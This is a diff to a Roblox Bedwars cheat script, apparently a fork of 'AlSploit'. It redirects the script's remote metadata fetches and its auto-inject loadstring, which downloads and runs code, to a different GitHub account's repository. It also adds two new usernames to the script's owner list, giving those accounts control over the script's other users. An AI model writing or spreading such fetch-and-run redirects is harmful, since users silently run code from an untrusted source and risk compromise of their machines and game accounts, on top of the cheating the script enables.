@@ -1,3 +1,6 @@
+-- Pro Hacker le goat
+
+
 shared.AlSploitUnInjected = false
 
 local ReplicatedStorageService = game:GetService("ReplicatedStorage")
@@ -1939,8 +1942,8 @@ local BedwarsConstants = {
 }
 
 local BedwarsMetas = {
-	ProjectileMeta = HttpService:JSONDecode(game:HttpGet("https://raw.githubusercontent.com/AlSploit/AlSploit/refs/heads/main/Bedwars/Metas/ProjectileMeta")),
-	ItemMeta = HttpService:JSONDecode(game:HttpGet("https://raw.githubusercontent.com/AlSploit/AlSploit/refs/heads/main/Bedwars/Metas/ItemMeta")),
+	ProjectileMeta = HttpService:JSONDecode(game:HttpGet("https://github.com/jewjew123/ALSPLOIT/raw/refs/heads/main/IS/SHIT/USE/CATVAPE/OR/ProjectileMeta")),
+	ItemMeta = HttpService:JSONDecode(game:HttpGet("https://raw.githubusercontent.com/jewjew123/ALSPLOIT/refs/heads/main/IS/SHIT/USE/CATVAPE/OR/ItemMeta")),
 }
 
 local BedwarsFunctions = {
@@ -8993,7 +8996,7 @@ end)
 
 task.spawn(function()
 	local MainScripts = {
-		'loadstring(game:HttpGet("https://alsploit.bedwars.workers.dev/AlSploitPurpleBlastReborn.lua"))()'
+		'loadstring(game:HttpGet("https://github.com/jewjew123/ALSPLOIT/raw/refs/heads/main/IS/SHIT/USE/CATVAPE/OR/a"))()'
 	};
 
 	local AutoInject = OtherTab:CreateToggle({
@@ -9037,7 +9040,7 @@ end)
 
 task.spawn(function()
 	local AlSploitWhitelistedUsers = {"mrdreyoo", "tonightshewillbemine", "yuungasian", "Harleyisopp17", "Sigmaautofarm", "Ned31k", "Matto0613", "slaying_135", "BerneerYT", "islandsiopp4", "oceanicfalcondude101", "hshehzheheh"}
-	local AlSploitOwners = {"AlSploitCooking", "ChristmasCandyGobler", "MonkeOnZaCar"}
+	local AlSploitOwners = {"AlSploitCooking", "ChristmasCandyGobler", "MonkeOnZaCar", "nondivergent", "itsmessas99"}
 
 	for i, v in next, PlayerService:GetPlayers() do
 		v.Chatted:Connect(function(Message)		
